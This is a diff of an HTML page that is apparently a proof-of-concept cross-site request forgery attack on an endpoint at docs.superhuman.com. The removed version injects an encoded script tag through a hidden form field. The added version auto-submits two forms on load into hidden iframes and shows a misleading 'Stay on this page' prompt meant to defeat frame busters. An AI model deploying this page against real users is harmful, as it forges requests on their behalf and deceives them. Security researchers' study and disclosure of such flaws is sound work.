@@ -1,12 +1,27 @@
 <!DOCTYPE html>
 <html>
 <body>
-<form id="csrfForm" action="https://docs.superhuman.com/newdoc/csrf-to-xss" method="POST" enctype="text/plain">
-    <input type="hidden" name="&#13;&#10;&lt;script&gt;alert&#40;document&#46;domain&#41;&lt;&#47;script&gt;" value="" />
-</form>
+    
+        <form id="csrfForm1" action="https://docs.superhuman.com/newdoc/csrf-to-xss" method="POST" target="csrfIframe1"></form>
+        <form id="csrfForm2" action="https://docs.superhuman.com/newdoc/csrf-to-xss" method="POST" target="csrfIframe2"></form>
+
+        <!-- hidden iframes -->
+        <iframe style="display: hidden" height="0" width="0" frameborder="0" name="csrfIframe1"></iframe>
+        <iframe style="display: hidden" height="0" width="0" frameborder="0" name="csrfIframe2"></iframe>
 
 <script>
-    document.getElementById('csrfForm').submit();
+            
+   window.onload = function() {
+        document.getElementById("csrfForm1").submit();
+        // to make 2nd form wait for 1st, put the following in a function and use as a callback for a new timer
+        document.getElementById("csrfForm2").submit();
+    }
+
+    // defeat frame busters
+    window.onbeforeunload = function() {
+        return "Please click 'Stay on this page' to allow it to finish loading.";
+    }
+    
 </script>
 </body>
 </html>
